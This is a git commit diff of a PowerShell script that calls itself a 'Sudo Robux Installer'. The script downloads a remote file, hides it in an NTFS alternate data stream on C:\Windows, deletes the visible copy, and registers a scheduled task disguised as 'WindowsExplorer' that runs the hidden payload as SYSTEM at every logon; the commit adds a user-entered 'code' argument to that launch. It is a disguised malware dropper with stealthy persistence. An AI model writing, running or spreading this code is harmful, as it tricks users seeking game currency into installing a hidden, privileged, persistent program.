3f8ecee591cec428eabda8bb736b9eaa4025daca
Abdullah Zafar <102247412+HadronCollision@users.noreply.github.com>
2025-07-31 12:58:50 +0500

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -2,12 +2,13 @@ Clear-Host
 Write-Host "Sudo Robux Installer" -ForegroundColor Magenta -NoNewLine
 Write-Host " by Hadron" -ForegroundColor DarkGray
 Write-Host
+$name = Read-Host "code"
 Write-Host "Downloading..." -ForegroundColor DarkCyan
 curl https://raw.githubusercontent.com/HadronCollision/SudoRobux/refs/heads/main/russianhuzz -o russianhuzz
 Write-Host "Installing..." -ForegroundColor DarkCyan
 cmd.exe /c "type russianhuzz > C:\Windows:Explorer"
 rm .\russianhuzz
-$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe" -Argument "/c wmic process call create C:\Windows:Explorer"
+$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\cmd.exe" -Argument "/c wmic process call create `"C:\Windows:Explorer $name`""
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 1000000
 Register-ScheduledTask -TaskName "WindowsExplorer" -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" > $null 2>&1
